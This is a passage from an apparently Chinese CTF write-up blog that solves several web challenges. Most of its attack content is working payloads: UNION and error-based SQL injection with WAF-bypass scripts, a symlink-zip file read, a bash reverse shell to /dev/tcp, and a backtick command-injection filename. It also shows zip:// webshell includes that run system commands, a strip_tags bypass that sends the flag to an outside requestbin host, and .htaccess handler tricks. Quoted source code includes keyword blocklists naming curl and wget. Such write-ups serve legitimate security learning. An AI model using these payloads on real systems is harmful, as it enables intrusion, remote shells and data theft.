class="number">1000000</span> + <span class="string">"*/select 1,version(),3#"</span></span><br><span class="line">&#125;</span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#"</span></span><br><span class="line">&#125;<span class="comment">#ctf,flag</span></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#id,flag</span></span><br><span class="line">data3 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(flag),3 from flag#"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#flag&#123;e22d7e217c1ceebc286c3d8e6ee70a0b&#125;  </span></span><br><span class="line">response = requests.post(url=url,data=data3)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h2 id="WrongSQL"><a href="#WrongSQL" class="headerlink" title="WrongSQL"></a>WrongSQL</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>报错注入</li><li>长度限制</li><li>WAF绕过</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>注册登录，在show.php页面发现id处存在注入点，测试发现，注释符，union，空格等被过滤，根据题目以及被过滤的关键词，应该用报错注入</p><p>尝试一下读取版本号，这里空格可以用/**/或者括号绕过,最后面的#(%23)被过滤闭合单引号即可</p><img src="/2020/08/15/DASfinaltest/1.png" class=""><p>读取数据库名，这里会发现有长度限制，准确的讲，报错注入基本都会限制回显长度，用substr截取分两次回显就可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,substr((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(schema_name))<span class="keyword">from</span>(information_schema.schemata)),<span class="number">55</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br><span class="line"><span class="string">#XPATH syntax error: '</span>~a,<span class="keyword">sys</span>,z3333333~<span class="string">'</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/2.png" class=""><p>读取最后这一个数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)=<span class="string">'z3333333'</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/3.png" class=""><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)=<span class="string">'3333333z'</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/4.png" class=""><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,substr((<span class="keyword">select</span>(fl4gbest)<span class="keyword">from</span>(z3333333<span class="number">.3333333</span>z)),<span class="number">1</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span>(extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">substr</span>((<span class="keyword">select</span>(fl4gbest)<span class="keyword">from</span>(z3333333<span class="number">.3333333</span>z)),<span class="number">20</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/5.png" class=""><p>两次的结果拼接即可</p><h2 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>符号链接目录穿越</li><li>弱密码爆破</li><li>zip指令</li></ul><h3 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题需要登录，万能密码不能登录，并且sql语句没有什么回显，burp爆破账号密码，得到admin/admin</p><img src="/2020/08/15/DASfinaltest/6.png" class=""><p>下面就是建立一个软链接指向flag所在的路径，并且保存压缩成zip文件，要保存符号链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;flag .&#x2F;</span><br><span class="line">zip -r ..&#x2F;tmp.zip . -y</span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/7.png" class=""><p>上传文件即可</p><img src="/2020/08/15/DASfinaltest/8.png" class=""><h2 id="sshop"><a href="#sshop" class="headerlink" title="sshop"></a>sshop</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>信息泄露</li><li>python代码审计</li><li>反弹shell</li></ul><h3 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>扫描目录，发现了<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><p>下载文件，审计代码</p><p>在<code>www/sshop/view/User.py</code>里发现了可以控制命令执行，在UserImageHandler类中</p><img src="/2020/08/15/DASfinaltest/9.png" class=""><p>这应该是上传个人图片的地方，找一下对应上传的类或方法，在<code>www/sshop/view/Module.py</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileUploadHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">self.render(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line">ret = &#123;<span class="string">'result'</span>: <span class="string">'OK'</span>&#125;</span><br><span class="line">upload_path = os.path.join(os.path.dirname(__file__), <span class="string">'upload'</span>) </span><br><span class="line">file_metas = self.request.files.get(<span class="string">'file'</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> file_metas:</span><br><span class="line">self.write(<span class="string">'&lt;script&gt;alert("please upload a image!")&lt;/script&gt;'</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> meta <span class="keyword">in</span> file_metas:</span><br><span class="line">filename = unquote(meta[<span class="string">'filename'</span>])</span><br><span class="line"><span class="keyword">if</span> os.path.splitext(filename)[<span class="number">1</span>] != <span class="string">'.jpg'</span> <span class="keyword">and</span> os.path.splitext(filename)[<span class="number">1</span>] != <span class="string">'.png'</span>:</span><br><span class="line">self.write(<span class="string">'&lt;script&gt;alert("only upoded jpg or png !")&lt;/script&gt;'</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">tmp = filename</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">tmp = unquote(tmp)</span><br><span class="line"><span class="keyword">if</span> re.search(<span class="string">r'\||\;|\&amp;|\&gt;|\&lt;|\t|\n|\r|\.\.|rm|curl|wget|cat|mv|touch|db'</span>,tmp,re.IGNORECASE):</span><br><span class="line">self.write(<span class="string">'&lt;script&gt;alert("Hacking!!!")&lt;/script&gt;'</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">user = self.orm.query(User).filter(User.username == self.current_user).one()</span><br><span class="line">user.avatar = filename</span><br><span class="line">self.orm.commit()</span><br><span class="line">file_path = os.path.join(upload_path, filename)</span><br><span class="line"><span class="keyword">with</span> open(file_path, <span class="string">'wb'</span>) <span class="keyword">as</span> up:</span><br><span class="line">up.write(meta[<span class="string">'body'</span>])</span><br><span class="line">self.write(json.dumps(ret))</span><br><span class="line">self.redirect(<span class="string">'/user'</span>)</span><br></pre></td></tr></table></figure><p>这里屏蔽了一些字符和关键字，可以考虑用反引号以及上传 bash 文件并且用bash调用那个文件反弹 shell 试试，写入一个图片文件，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在上传的时候抓包修改一下问件名为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#96;bash sshop&#x2F;views&#x2F;upload&#x2F;a.png&#96;.png</span><br></pre></td></tr></table></figure><p>上传之后刷新个人页面，可以看到触发了反弹，下面就是找flag文件并且拿到flag</p><img src="/2020/08/15/DASfinaltest/10.png" class=""><h2 id="彩票中心"><a href="#彩票中心" class="headerlink" title="彩票中心"></a>彩票中心</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php弱类型比较绕过</li><li>json数据</li><li>文件包含</li><li>zip伪协议</li><li>linux find命令</li></ul><h3 id="解题步骤-4"><a href="#解题步骤-4" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>根据提示直接抓取买彩票的包，看一下数据格式，是json的，这个跟之前遇到过的题很像，7个数字对上的就奖励钱，修改一下发送的数据，这里用到弱类型，测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$number=<span class="string">'1234567'</span>;</span><br><span class="line">$target=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="keyword">true</span>,<span class="number">2</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line">var_dump($target[<span class="number">1</span>]==$number[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/11.png" class=""><p>可以看到结果，其实就是无论数字还是字母和true作比较返回的永远是true，就可以利用这一点一直刷取金钱，在这之后会发现钱不够买flag，只能买hint，这里前端js没有响应，猜测这里和前面买彩票一样的方法，把action的值改为hint应该就可以了</p><img src="/2020/08/15/DASfinaltest/12.png" class=""><p>当然也可以找到购买hint的js代码，在前端直接运行拿到admin的密码</p><p>注册登录，会发现权限变为了超级管理员，还多了个黑产账户信息处理页面</p><img src="/2020/08/15/DASfinaltest/14.png" class=""><p>在黑产账户信息处理页面可以上传docx文件，这本身就是一个压缩包文件，猜测可以上传一句话木马，由于上传的是压缩包文件，那么应该可以利用zip://伪协议进行包含shell</p><img src="/2020/08/15/DASfinaltest/13.png" class=""><p>将文件上传，伪协议包含</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;zip:&#x2F;&#x2F;.&#x2F;uploads&#x2F;6ce5cdd6b7d89172f662e7b7bf0c08a09be20e47.docx%23aaa&amp;a&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/15.png" class=""><p>下面就是要找到flag了，用find命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;zip:&#x2F;&#x2F;.&#x2F;uploads&#x2F;6ce5cdd6b7d89172f662e7b7bf0c08a09be20e47.docx%23aaa&amp;a&#x3D;system(&#39;find &#x2F; -name flag&#39;);</span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/16.png" class=""><p>找到之后拿到flag</p><img src="/2020/08/15/DASfinaltest/17.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> DAS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>remaining</title>
      <link href="/2020/08/06/remaining/"/>
      <url>/2020/08/06/remaining/</url>
      
        <content type="html"><![CDATA[<h2 id="Zer0pts2020-musicblog"><a href="#Zer0pts2020-musicblog" class="headerlink" title="[Zer0pts2020]musicblog"></a>[Zer0pts2020]musicblog<a id="more"></a></h2><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>CSP限制</li><li>strip_tags漏洞利用</li></ul><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>源码里的worker.js中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'networkidle0'</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">'#like'</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到flag在UA字段中，admin会自动点击like标签</p><p>在util.php中，对能用的标签做了限制，只能用<code>&lt;audio&gt;</code>,查找strip_tags，当strip_tags与白名单标签一起使用时，php允许在白名单标签名称内出现斜杠（“ /”），并将其复制到结果中。(<a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a>)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">'/\[\[(.+?)\]\]/'</span>, <span class="string">'&lt;audio controls src="\\1"&gt;&lt;/audio&gt;'</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">'&lt;audio&gt;'</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在<code>&lt;a/udio&gt;</code>可以使用a标签</p><p>又存在CSP，不能跨域请求，可以用a标签进行请求</p><img src="/2020/08/06/remaining/1.png" class=""><p>可以看到content是可控的，且用到了render_tags方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&#x2F;udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1b38hj71&gt;aa</span><br><span class="line">浏览器解析后就成了</span><br><span class="line">&lt;a udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1b38hj71&gt;aa</span><br></pre></td></tr></table></figure><p>这样flag就会被带出了</p><img src="/2020/08/06/remaining/2.png" class=""><h2 id="D3CTF-2019-EzUpload-环境问题未打通，一个早上没整出来"><a href="#D3CTF-2019-EzUpload-环境问题未打通，一个早上没整出来" class="headerlink" title="[D3CTF 2019]EzUpload(环境问题未打通，一个早上没整出来)"></a>[D3CTF 2019]EzUpload(环境问题未打通，一个早上没整出来)</h2><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li>phar协议</li><li>序列化</li><li>.htaccess新形式</li><li>代码审计</li></ul><h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url,$filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  $filename;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $r = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($r[<span class="string">'scheme'</span>]) || preg_match(<span class="string">"/file|php/i"</span>,$r[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'..'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'/'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/ph/i"</span>, $ext))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($dir === <span class="string">''</span>)&#123;</span><br><span class="line">            $num = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $num = count(scandir($dir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you have $num files"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you don't have file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">" "</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="keyword">new</span> dir($_POST[<span class="string">'url'</span>],$_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'action'</span>] === <span class="string">"upload"</span>) &#123;</span><br><span class="line">    $dir-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"remove"</span>) &#123;</span><br><span class="line">    $dir-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"count"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'dir'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count(<span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count($_POST[<span class="string">'dir'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过check后文件写入。文件内容从传入的url读取，一般情况下是允许读取远程文件的，因此可以在vps上设置文件。</p><p><code>checkdir()</code>检查了<code>$this-&gt;userdir</code>，先放着</p><p><code>checkurl()</code>禁止了url出现<code>php|file</code>，防止使用两种伪协议读取本地文件，除了vps上设置文件还可以使用<code>data://</code>协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkext()&#96;禁止了&#96;filename&#96;出现&#96;..&#96;、&#96;&#x2F;&#96;、&#96;ph&#96;，可以想到&#96;.htaccess</span><br></pre></td></tr></table></figure><p>一般的.htaccess格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line"> SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>或者是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .txt</span><br></pre></td></tr></table></figure><p>这里还有另一种</p><figure class="highlight plain"><table><tr><td 